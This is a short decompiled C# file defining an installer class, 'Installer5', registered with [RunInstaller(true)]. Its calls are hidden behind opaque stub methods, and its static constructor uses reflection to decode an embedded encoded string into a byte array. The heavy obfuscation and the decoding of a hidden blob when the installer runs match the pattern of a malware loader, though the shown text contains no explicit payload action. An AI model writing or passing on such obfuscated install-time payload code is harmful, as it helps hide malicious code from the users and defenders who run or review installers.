using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Text;

namespace ade;

[RunInstaller(true)]
public class Installer5 : Installer
{
	internal static byte[] _E000;

	private IContainer _E001;

	public Installer5()
	{
		//Discarded unreachable code: IL_0002, IL_0003, IL_0006
		//IL_0007: Incompatible stack heights: 0 vs 1
		_E07B._E000(this);
	}

	protected override void Dispose(bool disposing)
	{
		//Discarded unreachable code: IL_0002, IL_0003, IL_0006
		//IL_0007: Incompatible stack heights: 0 vs 1
		if ((disposing || 1 == 0) && (_E001 != null || 1 == 0))
		{
			_E015._E000(_E001);
		}
		_E016._E000(this, disposing);
	}

	private void _E000()
	{
		//Discarded unreachable code: IL_0002, IL_0003, IL_0006
		//IL_0007: Incompatible stack heights: 0 vs 1
		_E001 = _E017._E000();
	}

	static Installer5()
	{
		//Discarded unreachable code: IL_0002, IL_0003, IL_0006
		//IL_0007: Incompatible stack heights: 0 vs 1
		Type type = _E01C._E000(typeof(Installer16.EncGetBytes).TypeHandle);
		Encoding encoding = _E07C._E000();
		Type type2 = _E01C._E000(typeof(Encoding).TypeHandle);
		string text = _E07D._E000();
		Type[] array = new Type[_E008._E000(1)];
		array[_E008._E000(0)] = _E01C._E000(typeof(string).TypeHandle);
		Installer5._E000 = _E080._E000((Installer16.EncGetBytes)_E07E._E000(type, encoding, _E068._E000(type2, text, array)), _E07F._E000());
	}
}
